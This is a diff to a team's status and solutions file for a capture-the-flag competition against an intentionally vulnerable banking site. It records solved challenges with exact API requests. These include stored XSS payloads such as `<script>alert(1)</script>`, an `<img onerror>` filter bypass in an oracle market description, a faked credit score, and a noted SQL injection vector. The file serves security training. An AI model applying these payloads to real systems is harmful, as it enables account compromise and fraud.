@@ -1,7 +1,7 @@
 # DarkMoney CTF — Status & Solutions
 
-**Competition:** Schwab 2026 Advanced | **Team score:** 1710 | **Team rank:** improving  
-**Progress:** 13 of 37 challenges solved  
+**Competition:** Schwab 2026 Advanced | **Team score:** 1910 | **Team rank:** improving  
+**Progress:** 14 of 37 challenges solved  
 **Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
 **Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
 **Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)
@@ -25,16 +25,13 @@
 | Borrowed Confidence | Trex | 320 | Business logic flaw — submit loan with fake creditScore: 850; server accepts without verification |
 | Say It Again | Trex | 100 | Stored XSS — `POST /api/transactions` with XSS in `remarks`, then `GET /api/transactions/statement/print` renders it |
 | By Any Other Name | Trex | 200 | Stored XSS in account displayName — `POST /api/accounts` with `displayName: '<script>alert(1)</script>'` |
+| The Prophecy That Speaks | Trex | 200 | XSS filter bypass — `POST /api/oracle/markets` with `<img src=x onerror=alert(1)>` in description (script tag blocked but img onerror bypasses V1 filter) |
 
-**Total earned: 1710 pts**
+**Total earned: 1910 pts**
 
 ---
 
 ## 🔄 IN PROGRESS (incomplete challenges)
-
-### The Prophecy That Speaks (Trex) — newly unlocked
-- **Vector:** Unknown — just unlocked; need to read description on crwd-ctrl
-- **Status:** Not yet investigated
 
 ### Honest Answers (Alpaca)
 - **Vector:** SQL injection in transaction search field
@@ -127,6 +124,12 @@ Additional challenges are still locked (unlock by completing prerequisites):
 - `POST /api/accounts` with `{"productId":"high-yield-savings","openingDeposit":100,"fundingType":"INTERNAL","fromAccountNo":"DMACC1001","displayName":"<script>alert(1)</script>"}`
 - Server stores XSS payload in account displayName — form UI never allows custom names
 - crwd-ctrl auto-detected when accounts page loaded
+
+### The Prophecy That Speaks — 200 pts
+- XSS guard "V1" blocks `<script>` tags but NOT other event handlers
+- `POST /api/oracle/markets` with `description: "<img src=x onerror=alert(1)> — this is a test market..."`
+- Fields required: `question`, `description` (min 12), `category` (POP/TECH/OFFICE/CIVIC), `closesAt`, `initialYesCents` (1-99), `depositCents` (2500-1000000)
+- Navigate to the created market URL to trigger XSS — crwd-ctrl auto-detected
 
 ---
 
